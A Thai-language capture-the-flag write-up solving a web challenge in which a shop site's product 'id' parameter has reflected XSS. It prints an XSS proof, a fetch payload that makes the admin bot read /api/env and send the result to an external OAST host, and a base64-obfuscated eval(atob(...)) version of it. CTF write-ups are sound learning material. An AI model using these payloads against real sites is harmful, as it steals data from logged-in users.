(ขอขอบคุณเฉลยฟรีจากทาง STH ที่มาไลฟ์ เล่นทำเอาซะปวดหัวเลย)

> หน่วยข่าวกรองได้รับข้อมูลมาว่า แก๊งมิจฉาชีพได้ใช้แบบฟอร์มบนหน้าเว็บไซด์นี้ในการส่งข้อมูลผิดกฎหมาย ทางที่ปรึกษาด้าน CyberSecurity บอกว่า เราอาจจะสามารถ เจาะระบบแก๊งมิจฉาชีพ ได้ถ้าเว็บไซด์นี้มีช่องโหว่ Cross-Site Scripting
> 
> 
> URL เว็บโจทย์ (มี Flag): [https://wtctt24.open.web3.p7z.pw](https://wtctt24.open.web3.p7z.pw/)
> 
> โค้ดเว็บ (ไม่มี Flag): https://static.wtctt24.p7z.pw/open_web3.zip
> 
> หมายเหตุ:
> 
> - Flag จะอยู่ในรูปแบบ flag{junior_webX_XXX} เช่น flag{open_web1_e758148af358200bf364c8d9282b7f04}
> - ช่องโหว่ไม่จำเป็นต้องทำ Port Scan ด้วย Nmap
> - ช่องโหว่ไม่จำเป็นต้องทำ URL Fuzzing เพื่อหา Directory หรือ File ที่เป็นชื่อลับ
> - โจทย์ไม่ได้ถูกออกแบบมาให้แก้ไข โดยใช้โปรแกรมสแกนช่องโหว่อัตโนมัติ

Browse เว็บขึ้นมา มาเป็นร้านลาบูบู้เลยนะ

![image](https://github.com/user-attachments/assets/3b4e57bc-e17d-43f2-af7e-b06d1c6987e1)

เลื่อนลงมาข้างล่าง ก็จะเจอเป็น Direct Message to Admin มีชื่อมีข้อความมีที่วางลิ้ง

![image](https://github.com/user-attachments/assets/1c688bdb-8cf4-48e0-9dc1-3b3a510a0942)

โจทย์ให้โค้ดมาด้วยก็เลยอ่ะ ลองไปอ่านโค้ดซิ

```javascript
route.get("/api/env", (req, res) => {

    if (!cookieHeader) {
        return res.status(403).json({ error: "access denied" });
    }

    const cookies = {};
    cookieHeader.split(';').forEach(cookie => {
        const [key, ...val] = cookie.trim().split('=');
        cookies[key] = val.join('=');
    });

    const accessToken = cookies['access_token'];

    if (accessToken === '<ADMIN_BOT_COOKIE>') {
        return res.json({ flag: "<FLAG>" });
    } else {
        return res.status(403).json({ error: "access denied" });
    }
});
```

เราต้องเอาคุกกี้ admin มาเพื่อไปยิง API env ซึ่งคุกกี้ที่ว่าก็ได้มาจากไหนต้องลองไปหาดู ไหนลองกลับไปดูที่ตัวเว็บอีกทีซิว่ามีอะไรอีกมั้ยที่ยังไม่ได้ดู เปิด page source ขึ้นมา เลื่อนลงไปดูเผื่อมี hint

![image](https://github.com/user-attachments/assets/206af1b4-bcb5-48eb-af32-376621d9cd63)

จะเห็นได้ว่า user admin สามารถเห็น secret menu ได้ แต่ก็ต้องฝันสลายเมื่อ cookie ของ admin โดนคุมกำเนิดด้วย HttpOnly อ่ะ งานหยาบละ (เพราะ HttpOnly มีฤทธิ์ทำให้ไม่สามารถรัน JavaScript จาก XSS ได้)
แต่ก็ยังไม่อับจนหนทาง เมื่อเราสังเกตได้ว่า ตอนที่เราไปคลิก view product เราจะเห็น parameter `id` โผล่มาต่อท้าย URL

![image](https://github.com/user-attachments/assets/32381556-e53d-45d1-ba08-489ee9330e59)

What if ถ้าเราลองยัด Reflected XSS ไปซักตัวล่ะ: `https://wtctt24.open.web3.p7z.pw/?id=%3Cimg+src=x+onerror=alert(1)%3E`

![image](https://github.com/user-attachments/assets/b3c78d2a-6e8d-42e5-beba-7dd50681f191)

โอเค Proof แล้วว่าเราตี XSS ที่ parameter `id` ได้ ซึ่งถ้าเราลองเอา URL ที่ว่านี่ไปใส่ในฟอร์ม admin = admin โดน XSS เต็มๆ แต่เราจะรันยังไงให้แหก HttpOnly ไปเอา cookie ได้ล่ะ
แล้วทำไมเราต้องไปขโมยคุกกี้? ในเมื่อเราสามารถยิงไปหา admin ให้ admin เอา flag มาให้เราตรงๆเลยก็ได้นี่นา จากการงม research และดูเฉลยก็จะได้ว่าเราจะยิง payload นี้ไปเพื่อให้ได้ flag ออกมาจาก API env:

```javascript
fetch("/api/env").then(r=>{r.text().then(t=>{ new Image().src="nfceupocysanalcdgsusjz4bhc62qtt4d.oast.fun/?"+encodeURIComponent(t))})})
```

(อย่าลืมเปิด `ngrok` or `interactsh-client` เอา OAST URL มาแปะใน payload ด้วย)
เราจะทำการยิงไปที่ `/api/env` แล้วให้ admin click link ส่ง flag กลับมาผ่าน request/response ที่จะยิงตรงกลับมาที่ OAST server ของเรา เพื่อป้องกันการถูก sanitize payload เอาไป encode base64 ก่อน

![image](https://github.com/user-attachments/assets/8d88f1c6-c2d5-4b16-888b-31403684d1dc)

แล้วเอา payload มาเข้าตัว XSS ที่เราได้ PoC ไปก่อนหน้านี้ ให้ payload ทำการรันคำสั่งแล้วแปลง base64 เป็นคำสั่งต้นฉบับ ทำให้ admin โดนให้คลิกลิ้งที่เราเตรียมไว้ (ต้องยิงเป็น http ไม่งั้นยิงไม่ได้ มันกันบอต)

![image](https://github.com/user-attachments/assets/1e32f81e-b159-4df0-87f4-7b553b26e772)

```javascript
http://wtctt24.open.web3.p7z.pw/?id=<img src=x onerror=eval(atob(`ZmV0Y2goIi9hcGkvZW52IikudGhlbihyPT57ci50ZXh0KCkudGhlbih0PT57IG5ldyBJbWFnZSgpLnNyYz0i4LmJaHR0cDovL25mY2V1cG9jeXNhbmFsY2Rnc3Vzano0YmhjNjJxdHQ0ZC5vYXN0LmZ1bi8/IitlbmNvZGVVUklDb21wb25lbnQodCkpfSl9KQ==`))>
```

ว่าแล้วก็เอาไปใส่ฟอร์ม กด send รอแป๊บนึงให้ admin ไปยิง env API ให้ แล้วเราจะได้ flag กลับมาเรียบร้อย

![image](https://github.com/user-attachments/assets/aed38e43-64a3-4d02-8781-7c725201c291)

![image](https://github.com/user-attachments/assets/07e6dd45-7165-45eb-8e1c-51720b5f1f51)

![image](https://github.com/user-attachments/assets/87de97a8-5d0a-48e2-a1b4-328f47aed04a)
